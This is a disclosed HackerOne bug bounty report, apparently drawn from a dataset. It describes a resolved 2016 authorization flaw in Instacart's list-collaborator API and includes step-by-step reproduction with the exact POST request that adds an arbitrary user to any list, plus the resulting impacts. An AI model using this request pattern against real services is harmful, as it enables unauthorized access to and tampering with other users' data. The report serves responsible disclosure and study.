---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '173969'
original_report_id: '173969'
title: Full access to any list
weakness: Privilege Escalation
team_handle: instacart
created_at: '2016-10-04T23:16:51.935Z'
disclosed_at: '2016-11-18T17:21:47.282Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 12
tags:
- hackerone
- privilege-escalation
---

# Full access to any list

## Metadata

- HackerOne Report ID: 173969
- Weakness: Privilege Escalation
- Program: instacart
- Disclosed At: 2016-11-18T17:21:47.282Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Overview
==
The endpoint for adding a list collaborator lacks authorization checks. A regular Instacart user can add themselves as a collaborator to any list and thus get full control over that list.

How to Reproduce
==
1. Choose a list that you want to edit, for example the one with id = 10.
2. Log in to Instacart.
3. Copy the cookie and anti-CSRF headers from one of the requests. 
4. Send a request:
    ```
    POST /api/v2/list_users
    Host: www.instacart.com
    Content-Type: application/json
    Cookie: ...
    X-CSRF-Token: ...
    
    {"list_user":{"list_id":10,"email":"your@email.com"}}
    ```

5. Open `https://www.instacart.com/api/v2/lists/10` in browser and grab the list's token (`7bHoerQ` in this case).
6. Open `http://www.instacart.com/store/giant/lists/7bHoerQ/edit` in browser and do whatever you want to the list.

Proof of Concept
==
```
GET https://www.instacart.com/api/v2/lists/10

{"meta":{"code":200},"data":{"id":10,"name":"Test sameoldstory" ...
```

Security Implications
==
This vulnerability can be used to:
 * See metadata of a private list.
 * See the personal name of a list owner, even if they chose to hide it.
 * Change metadata and items or even delete any list.
 * Affect product promotion by messing with popular lists.
 * Perform website defacement and phishing attacks.
 * Enhance stored XSS attacks by embedding them into the popular lists.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
